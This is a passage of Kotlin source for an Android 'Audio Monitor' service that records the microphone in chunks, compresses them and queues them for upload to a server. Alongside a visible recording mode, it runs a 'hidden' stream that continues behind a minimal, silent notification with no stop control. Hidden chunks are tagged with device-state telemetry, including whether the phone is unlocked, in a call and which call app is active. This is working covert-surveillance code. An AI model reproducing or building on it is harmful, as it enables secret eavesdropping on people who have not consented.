                        val isSilent = rmsDb < -50.0 // Silence threshold -50 dB

                        if (isSilent) {
                            consecutiveSilentChunks++
                            // Save periodic keep-alive chunk every 6 chunks (~60s) even during silence
                            if (consecutiveSilentChunks % 6 == 0) {
                                sendLog("Silence detected (%.1f dB) — sending periodic keep-alive chunk".format(rmsDb))
                                dispatchSaveChunk(chunkBuffer, chunkPos)
                            } else {
                                sendLog("Silence detected (%.1f dB) — skipped chunk save".format(rmsDb))
                            }
                        } else {
                            consecutiveSilentChunks = 0
                            dispatchSaveChunk(chunkBuffer, chunkPos)
                        }

                        // Start new chunk
                        chunkBuffer = ByteArray(chunkBytes)
                        chunkPos = 0

                        // If there were extra bytes, copy them to new chunk
                        if (bytesToCopy < bytesRead) {
                            val remaining = bytesRead - bytesToCopy
                            System.arraycopy(readBuffer, bytesToCopy, chunkBuffer, 0, remaining)
                            chunkPos = remaining
                        }

                        // Check storage health
                        checkStorage()
                    }
                } else if (bytesRead < 0) {
                    sendLog("AudioRecord read error: $bytesRead")
                    // Try to recover by waiting briefly
                    Thread.sleep(100)
                }

            } catch (e: InterruptedException) {
                // Service is stopping — save any partial chunk
                if (chunkPos > 0) {
                    sendLog("Saving partial chunk ($chunkPos bytes)")
                    dispatchSaveChunk(chunkBuffer, chunkPos)
                }
                break
            } catch (e: Exception) {
                sendLog("Recording error: ${e.message}")
                Thread.sleep(500)
            }
        }

        // Save any remaining data in buffer
        if (chunkPos > 0 && isRecording.get()) {
            dispatchSaveChunk(chunkBuffer, chunkPos)
        }

        sendLog("Recording loop ended")
    }

    private fun dispatchSaveChunk(pcmData: ByteArray, dataSize: Int) {
        val bufferCopy = pcmData.copyOf(dataSize)
        val doMain = isMainRecording
        val doHidden = isHiddenRecording
        serviceScope.launch(Dispatchers.IO + NonCancellable) {
            if (doMain) {
                saveChunk(bufferCopy, dataSize, "main")
            }
            if (doHidden) {
                saveChunk(bufferCopy, dataSize, "hidden")
            }
        }
    }

    private fun isPhoneInCall(): Boolean {
        return try {
            val tm = getSystemService(Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager
            val state = tm?.callState ?: android.telephony.TelephonyManager.CALL_STATE_IDLE
            state != android.telephony.TelephonyManager.CALL_STATE_IDLE
        } catch (e: Exception) {
            false
        }
    }

    private fun getCurrentAudioRoute(): String {
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                val devices = audioManager.getDevices(AudioManager.GET_DEVICES_OUTPUTS)
                for (device in devices) {
                    when (device.type) {
                        AudioDeviceInfo.TYPE_WIRED_HEADPHONES,
                        AudioDeviceInfo.TYPE_WIRED_HEADSET,
                        AudioDeviceInfo.TYPE_USB_HEADSET -> return "JCK"
                        
                        AudioDeviceInfo.TYPE_BLUETOOTH_A2DP,
                        AudioDeviceInfo.TYPE_BLUETOOTH_SCO,
                        AudioDeviceInfo.TYPE_BLE_HEADSET,
                        AudioDeviceInfo.TYPE_BLE_SPEAKER -> return "BLU"
                    }
                }
            } else {
                @Suppress("DEPRECATION")
                if (audioManager.isWiredHeadsetOn) return "JCK"
                @Suppress("DEPRECATION")
                if (audioManager.isBluetoothA2dpOn || audioManager.isBluetoothScoOn) return "BLU"
            }
        } catch (e: Exception) {
            // Ignore
        }
        return "SPK"
    }

    private fun isMicUsedByExternalApp(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                val am = getSystemService(Context.AUDIO_SERVICE) as? android.media.AudioManager
                val configs = am?.activeRecordingConfigurations ?: emptyList()
                configs.any { it.clientAudioSessionId != audioRecord?.audioSessionId }
            } catch (e: Exception) {
                false
            }
        } else {
            false
        }
    }

    /**
     * Compress PCM buffer to AAC (16 kbps) using hardware MediaCodec and save as .aac file.
     */
    private fun saveChunk(pcmData: ByteArray, dataSize: Int, targetStreamType: String) {
        try {
            val uuid = UUID.randomUUID().toString()
            val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
            val duration = dataSize.toDouble() / BYTE_RATE

            // 1-Hour Session Rotation Check per stream
            val streamStartMs = if (targetStreamType == "main") mainRecordingStartTimeMs else hiddenRecordingStartTimeMs
            if (streamStartMs > 0 && System.currentTimeMillis() - streamStartMs >= 3600_000L) {
                sendLog("1 hour recording duration reached for $targetStreamType — rotating session on server")
                uploadManager?.rotateSession(targetStreamType)
                if (targetStreamType == "main") mainRecordingStartTimeMs = System.currentTimeMillis()
                else hiddenRecordingStartTimeMs = System.currentTimeMillis()
            }

            // Phase 3: Enforce Storage Limit
            storageManager?.enforceStorageLimit()

            // Create AAC file
            val chunksDir = storageManager?.getChunksDirectory() ?: return
            
            // Phase 4: Telemetry in Segment Names
            val currentRoute = getCurrentAudioRoute()
            val rmsDb = calculateRMS(pcmData, dataSize)
            val positiveDb = (rmsDb + 100.0).toInt().coerceIn(0, 99)
            val isSpeech = rmsDb >= -50.0
            lastChunkIsSpeech = isSpeech
            lastChunkDb = positiveDb

            val dTag = if (isScreenOn()) "D1" else "D0"
            val uTag = if (isDeviceUnlocked()) "U1" else "U0"
            val cTag = currentPowerSource
            val rTag = getRingerMode()
            val vTag = if (isSpeech) "V1" else "V0"
            val dbTag = "dB$positiveDb"

            val telemetrySuffix = if (targetStreamType == "hidden") {
                val tTag = "T$currentBatteryTempC"
                val mTag = if (isDeviceMoving) "M1" else "M0"
                val pTag = "P$currentPosture"
                val aTag = getCallAppTag()
                "_B${currentBatteryPct}_S${currentStorageMB}_O${currentRoute}_${dTag}_${uTag}_${cTag}_${rTag}_${vTag}_${dbTag}_${tTag}_${mTag}_${pTag}_${aTag}"
            } else {
                "_B${currentBatteryPct}_S${currentStorageMB}_O${currentRoute}"
            }
            val aacFile = File(chunksDir, "chunk_${System.currentTimeMillis()}_${targetStreamType}${telemetrySuffix}.aac")
            
            // Update timestamp to include telemetry for the server HLS generation
            val timestampWithTelemetry = timestamp + telemetrySuffix

            // Encode PCM to AAC
            encodePcmToAac(pcmData, dataSize, aacFile)

            // Compute checksum
            val checksum = computeSha256(aacFile)
            val inCall = isPhoneInCall()
            val micInUse = isMicUsedByExternalApp()

            // Create chunk record
            val chunk = AudioChunk(
                uuid = uuid,
                filePath = aacFile.absolutePath,
                timestamp = timestampWithTelemetry,
                duration = duration,
                fileSize = aacFile.length(),
                checksum = checksum,
                inCall = inCall,
                micInUse = micInUse,
                streamType = targetStreamType
            )

            // Enqueue for upload (runs on coroutine)
            serviceScope.launch {
                uploadManager?.enqueueChunk(chunk)
            }

        } catch (e: Exception) {
            sendLog("ERROR saving AAC chunk ($targetStreamType): ${e.message}")
        }
    }

    private fun encodePcmToAac(pcmData: ByteArray, dataSize: Int, outFile: File) {
        val codec = MediaCodec.createEncoderByType("audio/mp4a-latm")
        val format = MediaFormat.createAudioFormat("audio/mp4a-latm", SAMPLE_RATE, 1).apply {
            setInteger(MediaFormat.KEY_AAC_PROFILE, MediaCodecInfo.CodecProfileLevel.AACObjectLC)
            setInteger(MediaFormat.KEY_BIT_RATE, 16000) // 16 kbps Ultra-Low Bandwidth
        }
        codec.configure(format, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
        codec.start()

        FileOutputStream(outFile).use { fos ->
            var inputOffset = 0
            var isEOS = false
            val bufferInfo = MediaCodec.BufferInfo()

            while (!isEOS || (bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM) == 0) {
                if (!isEOS) {
                    val inputBufferIndex = codec.dequeueInputBuffer(10000)
                    if (inputBufferIndex >= 0) {
                        val inputBuffer = codec.getInputBuffer(inputBufferIndex)!!
                        val capacity = inputBuffer.capacity()
                        val bytesToFeed = minOf(dataSize - inputOffset, capacity)

                        if (bytesToFeed > 0) {
                            inputBuffer.put(pcmData, inputOffset, bytesToFeed)
                            inputOffset += bytesToFeed
                            codec.queueInputBuffer(inputBufferIndex, 0, bytesToFeed, 0, 0)
                        } else {
                            codec.queueInputBuffer(inputBufferIndex, 0, 0, 0, MediaCodec.BUFFER_FLAG_END_OF_STREAM)
                            isEOS = true
                        }
                    }
                }

                var outputBufferIndex = codec.dequeueOutputBuffer(bufferInfo, 10000)
                while (outputBufferIndex >= 0) {
                    val outputBuffer = codec.getOutputBuffer(outputBufferIndex)!!
                    if ((bufferInfo.flags and MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) {
                        bufferInfo.size = 0
                    }
                    if (bufferInfo.size > 0) {
                        outputBuffer.position(bufferInfo.offset)
                        outputBuffer.limit(bufferInfo.offset + bufferInfo.size)

                        // Add ADTS header for AAC chunk
                        val packetLen = bufferInfo.size + 7
                        val adtsHeader = ByteArray(7)
                        addAdtsHeader(adtsHeader, packetLen)
                        fos.write(adtsHeader)

                        val data = ByteArray(bufferInfo.size)
                        outputBuffer.get(data)
                        fos.write(data)
                    }
                    codec.releaseOutputBuffer(outputBufferIndex, false)

                    if ((bufferInfo.flags and MediaCodec.BUFFER_FLAG_END_OF_STREAM) != 0) {
                        break
                    }
                    outputBufferIndex = codec.dequeueOutputBuffer(bufferInfo, 10000)
                }
            }
            fos.flush()
            fos.fd.sync()
        }
        codec.stop()
        codec.release()
    }

    private fun addAdtsHeader(packet: ByteArray, packetLen: Int) {
        val profile = 2 // AAC LC
        val freqIdx = 8 // 16kHz (Sampling frequency index for 16000Hz is 8)
        val chanCfg = 1 // Mono

        packet[0] = 0xFF.toByte()
        packet[1] = 0xF9.toByte()
        packet[2] = (((profile - 1) shl 6) + (freqIdx shl 2) + (chanCfg shr 2)).toByte()
        packet[3] = (((chanCfg and 3) shl 6) + (packetLen shr 11)).toByte()
        packet[4] = ((packetLen and 0x7FF) shr 3).toByte()
        packet[5] = (((packetLen and 7) shl 5) + 0x1F).toByte()
        packet[6] = 0xFC.toByte()
    }

    /**
     * Compute SHA-256 checksum of a file.
     */
    private fun computeSha256(file: File): String {
        val digest = MessageDigest.getInstance("SHA-256")
        file.inputStream().use { input ->
            val buffer = ByteArray(8192)
            var read: Int
            while (input.read(buffer).also { read = it } != -1) {
                digest.update(buffer, 0, read)
            }
        }
        return digest.digest().joinToString("") { "%02x".format(it) }
    }

    // ══════════════════════════════════════════════════════════════════════
    // STORAGE HEALTH
    // ══════════════════════════════════════════════════════════════════════

    private fun checkStorage() {
        val health = storageManager?.checkStorageHealth() ?: "ok"
        when (health) {
            "critical" -> sendLog("⚠️ CRITICAL: Storage very low! < 100 MB free")
            "warning" -> sendLog("⚠️ Storage low: < 500 MB free")
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // CLIENT NAME GENERATION
    // ══════════════════════════════════════════════════════════════════════

    private fun generateClientName(): String {
        // Check if we have a saved name
        val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
        val saved = prefs.getString("client_name", null)
        if (saved != null) return saved

        // Generate from device info
        val manufacturer = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model = Build.MODEL.replace(" ", "-")
        val name = "$manufacturer-$model"

        // Save for future use
        prefs.edit().putString("client_name", name).apply()
        return name
    }

    // ══════════════════════════════════════════════════════════════════════
    // CALLBACKS
    // ══════════════════════════════════════════════════════════════════════

    private fun onConnectionStateChanged(state: ConnectionState) {
        connectionState = when (state) {
            ConnectionState.CONNECTED -> "Connected"
            ConnectionState.DISCONNECTED -> "Disconnected"
            ConnectionState.RECONNECTING -> "Reconnecting"
            ConnectionState.WAITING -> "Waiting"
            ConnectionState.CONNECTING -> "Connecting"
            ConnectionState.ERROR -> "Error"
            ConnectionState.STOPPED -> "Stopped"
            ConnectionState.IDLE -> "Idle"
        }
        broadcastStateUpdate()
        updateNotification()
    }

    private fun onUploadStatsUpdate(pending: Int, retries: Int) {
        pendingUploads = pending
        totalRetries = retries
        broadcastStateUpdate()
        updateNotification()
    }

    // ══════════════════════════════════════════════════════════════════════
    // NOTIFICATIONS
    // ══════════════════════════════════════════════════════════════════════

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Audio Monitor",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Continuous audio recording and upload service"
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(status: String): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent, PendingIntent.FLAG_IMMUTABLE
        )

        val title = if (isMainRecording) "Audio Recorder" else "Audio Monitor"
        val text = if (isMainRecording) "Recording audio..." else "Active in background"

        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)

        // Only add Stop button if visible main recording is active, and action stops MAIN ONLY
        if (isMainRecording) {
            val stopMainIntent = Intent(this, AudioRecordService::class.java).apply {
                action = ACTION_STOP_MAIN
            }
            val stopMainPending = PendingIntent.getService(
                this, 1, stopMainIntent, PendingIntent.FLAG_IMMUTABLE
            )
            builder.addAction(android.R.drawable.ic_media_pause, "Stop", stopMainPending)
        }

        return builder.build()
    }

    private fun updateNotification() {
        if (!isRunning && !isStandbyMode) return
        try {
            val status = if (isRunning) connectionState else "Standby"
            val manager = getSystemService(NotificationManager::class.java)
            manager.notify(NOTIFICATION_ID, buildNotification(status))
        } catch (e: Exception) {
            // Non-critical
        }
    }

    private var notificationUpdaterJob: Job? = null

    private fun startNotificationUpdater() {
        // Cancel any existing updater before starting a new one
        notificationUpdaterJob?.cancel()
        notificationUpdaterJob = serviceScope.launch {
            while (isActive && (isRunning || isStandbyMode)) {
                delay(1000)  // Broadcast live stats to in-app UI every second
                if (isRunning) {
                    val startMs = if (mainRecordingStartTimeMs > 0) mainRecordingStartTimeMs else hiddenRecordingStartTimeMs
                    if (startMs > 0) {
                        totalRecordingSeconds = (System.currentTimeMillis() - startMs) / 1000
                    }
                }
                withContext(Dispatchers.Main) {
                    broadcastStateUpdate()
                }
            }
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // BROADCASTS TO UI
    // ══════════════════════════════════════════════════════════════════════

    private fun broadcastStateUpdate() {
        val intent = Intent(ACTION_STATE_UPDATE).apply {
            setPackage(packageName)
            putExtra(EXTRA_PENDING, pendingUploads)
            putExtra(EXTRA_RETRIES, totalRetries)
            putExtra(EXTRA_DURATION, totalRecordingSeconds)
            putExtra(EXTRA_CONNECTION, connectionState)
            putExtra(EXTRA_STORAGE, storageManager?.getStorageSummary() ?: "")
        }
        sendBroadcast(intent)
    }

    private fun sendLog(message: String) {
        val intent = Intent(ACTION_LOG).apply {
            setPackage(packageName)
            putExtra(EXTRA_MESSAGE, message)
        }
        sendBroadcast(intent)
    }

    // ══════════════════════════════════════════════════════════════════════
    // WAKE LOCK
    // ══════════════════════════════════════════════════════════════════════

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "AudioMonitor::RecordingWakelock"
        ).apply {
            setReferenceCounted(false)
            acquire(24 * 60 * 60 * 1000L)  // 24 hours CPU hold
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (e: Exception) { /* ignore */ }
        wakeLock = null
    }

    // ══════════════════════════════════════════════════════════════════════
    // HELPERS
    // ══════════════════════════════════════════════════════════════════════

    private fun formatDuration(seconds: Long): String {
        val h = seconds / 3600
        val m = (seconds % 3600) / 60
        val s = seconds % 60
        return if (h > 0) String.format("%02d:%02d:%02d", h, m, s)
        else String.format("%02d:%02d", m, s)
    }
}
